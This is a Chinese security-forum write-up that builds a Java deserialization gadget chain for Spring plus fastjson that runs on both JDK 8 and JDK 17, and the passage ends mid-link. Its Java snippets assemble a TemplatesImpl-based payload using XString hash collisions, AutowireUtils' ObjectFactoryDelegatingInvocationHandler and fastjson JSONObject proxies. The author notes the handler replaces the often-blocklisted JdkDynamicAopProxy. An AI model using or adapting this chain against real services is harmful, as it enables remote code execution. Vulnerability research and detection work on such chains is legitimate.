---
title: spring+fastjosn  杀穿jdk gadegt
url: https://forum.butian.net/share/4539
source: 奇安信攻防社区
date: 2025-09-18
fetch_date: 2025-10-02T20:17:08.538852
---

# spring+fastjosn  杀穿jdk gadegt

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### spring+fastjosn 杀穿jdk gadegt

至此在spring+fj的依赖下，我们得到了一条jdk8生成在jdk17可用且不用考虑serid带来影响的类加载链子。

0x01 前提
-------
​ 最近出了spring下的jdk17 template链。其主要主要利用aop去代理javax.xml.transform.Templates, 这样在出发getoutputProperties时，moudle就是变为了javax.xml.transform 在一个包下，绕过了moudle限制。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-a880c83e9de364db5da5ad323e50e92dc7a03844.png)
在不使用aop代理的时候。 不在一个包下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-c626d4a45286beb0a83b6d420f462576da4995e4.png)
可见核心就是使用JdkDynamicAopProxy去代理。
在测试过程中，我发现了高低版本spring的aop 会有 serid不一致的问题。而且由于一般我们都是用jdk8的工具去生成反序列化数据。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-4c4b7a34e82f6275d523137a769f0519783a662e.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-a8320fd60a755dc2e561c0e6044a353df1cec521.png)
然么这个问题该怎么解决了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-1f64d4d0e346e10323fef601b01f7e820173134e.png)
使用chains得serdunmp 解析了修改后在重新build。
但是在继续测试时, 发现了tostring头的serid也不一致
```php
eventtostring
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-2bc19ed9561438bcbcf02d3399eab3489f2bfab7.png)
```php
UIDefaults$TextAndMnemonicHashMap2tostring
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-ab362f9f52649403e4ee9b357deb09ba489d00b9.png)
```php
BadAttributeValueExpException 在jdk17 也g了
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-af71fff2d0283a3393467129fc1f6d8e04098dbd.png)
怎么解决了？ 我们知道jdk17绕过主利用动态代理，也就是我们完全可以换一下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-ee2a13b9e0b3242eb8bd4576c1ac5983678e98bb.png)
直接使用cb利用chains的强大拼接功能就可以解决。直接cb打穿jdk！！！
也可以是用cc里面的tostring去出发，这些也在chains里有。利用cc(\*\*全版本通用\*\*)的CaseInsensitiveMap去出发，借助于第三方依赖来进行tostring，这样就不会有serid的问题
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-0df6cb3b925bf38c3cb23255277fc4cffb1446f8.png)
```java
//cc4 换org.apache.commons.collections4.map.CaseInsensitiveMap
Map s = (Map) utils.createWithoutConstructor("org.apache.commons.collections.map.CaseInsensitiveMap");
Class&lt;?&gt; nodeB;
nodeB = Class.forName("org.apache.commons.collections.map.AbstractHashedMap$HashEntry");
Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB, int.class, Object.class, Object.class);
nodeCons.setAccessible(true);
Object tbl = Array.newInstance(nodeB, 1);
Array.set(tbl, 0, nodeCons.newInstance(null, 0, toStringObj, toStringObj));
utils.setFieldValue(s, "data", tbl);
utils.setFieldValue(s, "size", 1);
```
具体构造如上。
但是这样都不太符合懒人选择,要选来选去,还要考虑jdk带来的serid 影响。
### 0x02 分析
​ so? 我们肯定是希望找一个在jdk8和在jdk17上 serid都一致的出发头，最后不依赖第三方，这也是为了以后方便拼接。所以com.sun.org.apache.xpath.internal.objects.XString就来了。
com.sun.org.apache.xpath.internal.objects.XString
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-8a6255c6883b30f029fdf11697e2d5a4306baf4f.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-336c6e4c55b0c56b81216ce1c4712f20ccb0507b.png)
他们的serid以及子类是一样的。
也就是我们只需要利用xstring的equals来出发tostring就好了。也就是把hascode搞一致就行了
```java
Class&lt;?&gt; aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
Object xstring = utils.createWithoutConstructor(aClass1);
utils.setFieldValue(xstring,"m\_obj",new char[]{});
HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();
//zZ,yy 也行
hashMap1.put("通话",xstring);
hashMap1.put("重地",node);
hashMap2.put("重地",xstring);
hashMap2.put("通话",node);
HashMap map = utils.makeMap(hashMap1, hashMap2);
```
总结一下就是这样就行了，两个map的hashcode会一致，进而出发\*\*xstring.equals.node\*\*。这样我们在jdk8生成的序列化就可以在jdk17上用了。
现在就是aop高低版本下的serid不一致。或者我们不妨在限制一下
```php
org.springframework.aop.framework.JdkDynamicAopProxy
```
在黑名单的情况（许多产品的黑名单里常客。）
### 0x03 spring+fj
​ 这里也发现可以用org.springframework.beans.factory.support.AutowireUtils.ObjectFactoryDelegatingInvocationHandler来进行替代，它在高低版本的sprinh中也没有serid的问题（\*\*我测试高低版本没有，aop是会包serid不一致\*\*）
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-f4abb873fcb0edc0c830205b94a80a491be331fe.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-b3bdd36f2ac749f96c5f5a1454eb901edffbb934.png)
ObjectFactory接口的getter然后会返回一个泛型T。
也就是我们使用这个ObjectFactoryDelegatingInvocationHandler去javax.xml.transform.Templates, 然后在\*\*objectFactory.getObject()\*\*返回一个\*\*templatesImpl\*\*就可以达到和aop代理一样的效果了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-4def0624eee715dc9e6cf02155493e50e53d629c.png)
但是显然在spring里是没有的。但是它也是个接口,还可以通过动态代理来返回templatesImpl对象
在查找资料的时候发现了补天社区有大哥文章中有现成的。
com.alibaba.fastjson.JSONObject#invoke
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-0333e98788cbe2fb19bc16c47eeb09f64ddd6dde.png)
它会从map中获取vaule，然后调用TypeUtils.cast进行强转后返回。method.getGenericReturnType()它会获取强转的类型。 最巧的来了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-6195d66213e4ac76f8d7fd0b8fd92b32307e1b61.png)
利用jsonobject代理ObjectFactory接口 那么然后强转的就是T，也就是可以成功返回一个templatesImpl对象，不会导致强转类型失败。
整理一下代码
```java
HashMap hashMap = new HashMap&lt;&gt;();
hashMap.put("object", templates);
JSONObject jsonObject = new JSONObject(hashMap);
Object o2 = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{ObjectFactory.class},jsonObject);
Object inv = utils.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
utils.setFieldValue(inv, "objectFactory", o2);
Object o = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{Templates.class},(InvocationHandler)inv);
JSONArray objects = new JSONArray();
objects.add(o);
XString xstring=new XString("");
HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();
hashMap1.put("通话",xstring);
hashMap1.put("重地",objects);
hashMap2.put("重地",xstring);
hashMap2.put("通话",objects);
HashMap map = utils.makeMap(hashMap1, hashMap2);
```
### 0x04 坑
​ 我们知道fastjson在1.2.48以后原生序列化是有了自己的readObject。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-f99cc55c5fea17bda69213038315fafbd54b0ed2.png)
SecureObjectInputStream重写了resolveClass，调用了`checkAutoType`检查。
具体原理可以查看y4tacker师傅的博客
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-e3165d2996c6c62fb9fbc703bac1312ffbbdace6.png)
在jdk8下生成好数据后，
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-29cb68fa6a0e23923362812bb03c88f56ce3d647.png)
jdk17下 还是调用不了。
简单说明一下原因
com.alibaba.fastjson.JSONObject#readObject
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-9cd0d4e0f2e901f4807af0575da4f0781f8fa963.png)
com.alibaba.fastjson.JSONObject.SecureObjectInputStream
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-4bb045e53f4a914c9e5d38baa24e079fd10ee1ce.png)
fj的SecureObjectInputStream 在反序列的时候使用了反射，但是由于没有导包，然后没有预期的绕过。所以我们加上\*\*--add-opens java.base/java.io=ALL-UNNAMED\*\*即可。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-f8bd503bb7d2a006f3511412c15b3fa012d7ec3a.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-2b52f9a8071597ee43dc87394f63a54e0ba7863b.p...